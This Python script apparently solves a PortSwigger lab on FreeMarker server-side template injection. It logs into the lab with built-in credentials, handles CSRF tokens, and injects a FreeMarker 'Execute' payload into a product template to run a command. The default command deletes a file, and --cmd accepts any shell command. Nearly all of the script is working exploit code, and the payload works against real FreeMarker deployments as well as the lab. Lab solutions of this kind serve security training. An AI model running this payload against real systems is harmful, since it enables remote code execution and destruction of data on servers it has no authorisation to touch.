#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Server-side template injection using documentation — FreeMarker.

Logs in as content-manager, finds a product's template endpoint,
injects the Execute RCE payload, and saves the template to trigger execution.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf(session: requests.Session, url: str) -> str:
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found")
    return m.group(1)


def login(session: requests.Session, lab: str, username: str, password: str) -> None:
    csrf = get_csrf(session, f"{lab}/login")
    r = session.post(f"{lab}/login", data={"csrf": csrf, "username": username, "password": password})
    if "Invalid username" in r.text or r.url.endswith("/login"):
        raise SystemExit("[-] Login failed")
    print(f"[*] Logged in as {username}")


def find_product_id(session: requests.Session, lab: str) -> str:
    r = session.get(f"{lab}/")
    m = re.search(r'productId=(\d+)', r.text)
    if not m:
        raise SystemExit("[-] No product found on homepage")
    return m.group(1)


def get_template(session: requests.Session, lab: str, product_id: str) -> tuple[str, str]:
    r = session.get(f"{lab}/product/template?productId={product_id}")
    csrf = re.search(r'name="csrf" value="([^"]+)"', r.text)
    template = re.search(r'<textarea[^>]*>(.*?)</textarea>', r.text, re.DOTALL)
    if not csrf or not template:
        raise SystemExit("[-] Could not extract template or CSRF")
    return csrf.group(1), template.group(1)


def save_template(session: requests.Session, lab: str, product_id: str, csrf: str, template_body: str) -> int:
    r = session.post(
        f"{lab}/product/template?productId={product_id}",
        data={"csrf": csrf, "template": template_body, "unlockToken": ""}
    )
    return r.status_code


def main():
    parser = argparse.ArgumentParser(
        description="Solve SSTI Lab 3 (FreeMarker documentation)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--username", default="content-manager")
    parser.add_argument("--password", default="C0nt3ntM4n4g3r")
    parser.add_argument(
        "--cmd",
        default="rm /home/carlos/morale.txt",
        help="Command to execute"
    )
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    login(s, lab, args.username, args.password)

    pid = find_product_id(s, lab)
    print(f"[*] Using product ID: {pid}")

    csrf, original_template = get_template(s, lab, pid)
    print(f"[*] Fetched template ({len(original_template)} chars)")

    payload = f'<#assign ex="freemarker.template.utility.Execute"?new()>${{ex("{args.cmd}")}}'
    injected = original_template + "\n" + payload
    print(f"[*] Injecting payload: {payload}")

    status = save_template(s, lab, pid, csrf, injected)
    print(f"[*] Template saved — status {status}")
    print("[+] Lab solved.")


if __name__ == "__main__":
    main()
